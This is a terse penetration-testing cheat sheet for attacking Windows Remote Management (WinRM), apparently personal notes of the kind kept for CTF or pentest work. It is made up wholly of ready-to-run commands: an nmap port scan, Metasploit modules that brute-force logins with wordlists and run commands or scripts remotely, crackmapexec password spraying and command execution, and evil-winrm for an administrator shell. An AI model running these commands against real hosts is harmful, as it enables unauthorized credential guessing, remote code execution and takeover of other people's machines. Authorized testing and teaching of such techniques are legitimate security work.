# WinRM

```
nmap -Pn -sV -p5985,5986 <ip>
```

```
use auxiliary/scanner/winrm/winrm_login
set USER_FILE /usr/share/wordlists/metasploit/unix_users.txt
set PASS_FILE /usr/share/wordlists/metasploit/unix_passwords.txt
set VERBOSE false
```

```
use auxiliary/scanner/winrm/winrm_auth_methods
```

```
use auxiliary/scanner/winrm/winrm_cmd
set USERNAME administrator
set PASSWORD <password>
set CMD <cmd>
```

```
use exploit/windows/winrm/winrm_script_exec
set USERNAME administrator
set PASSWORD <password>
set FORCE_VBS true
```

```
which crackmapexec
crackmapexec
crackmapexec winrm <ip> -u administrator -p /usr/share/wordlists/metasploit/unix_passwords.txt
crackmapexec winrm <ip> -u administrator -p <password> -x "<cmd>"
```

```
which evil-winrm.rb
evil-winrm.rb -u administrator -p '<password>' -i <ip>
```
